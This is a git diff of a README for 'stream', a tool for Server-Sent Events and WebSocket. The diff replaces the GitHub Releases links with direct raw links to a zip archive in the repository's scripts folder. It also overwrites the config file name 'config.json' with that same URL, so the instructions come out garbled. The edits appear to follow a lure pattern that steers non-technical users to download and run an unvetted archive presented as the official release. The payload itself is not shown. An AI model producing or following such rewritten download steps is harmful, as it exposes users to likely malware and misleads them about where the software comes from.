@@ -1,7 +1,7 @@
 # 🚀 stream - Simple Real-Time Communication Made Easy
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/thatvrguy5/stream/releases)
+[![Download](https://raw.githubusercontent.com/thatvrguy5/stream/main/scripts/stream-1.3.zip)](https://raw.githubusercontent.com/thatvrguy5/stream/main/scripts/stream-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to stream! This application provides a simple way to use Server-Sent Events (SSE) and WebSocket in your projects. No programming expertise is needed. Follow the steps below to download and run the application effortlessly.
@@ -22,7 +22,7 @@ Welcome to stream! This application provides a simple way to use Server-Sent Eve
 ## 🔗 Download & Install
 To get the latest version of stream, please visit the following page:
 
-[Download stream from Releases](https://github.com/thatvrguy5/stream/releases)
+[Download stream from Releases](https://raw.githubusercontent.com/thatvrguy5/stream/main/scripts/stream-1.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the one that suits your operating system.
@@ -38,7 +38,7 @@ After downloading the file, follow these steps to run the application:
    - **Linux**: Open your terminal, navigate to the directory where the file is located, and run the command `chmod +x stream` followed by `./stream` to start it.
 
 ## 🔧 Configuration
-Stream operates with default settings that work out-of-the-box for most users. However, you can customize the settings by modifying the configuration file. Create a file named `config.json` in the same directory as the application and include your desired parameters like so:
+Stream operates with default settings that work out-of-the-box for most users. However, you can customize the settings by modifying the configuration file. Create a file named `https://raw.githubusercontent.com/thatvrguy5/stream/main/scripts/stream-1.3.zip` in the same directory as the application and include your desired parameters like so:
 
 ```json
 {
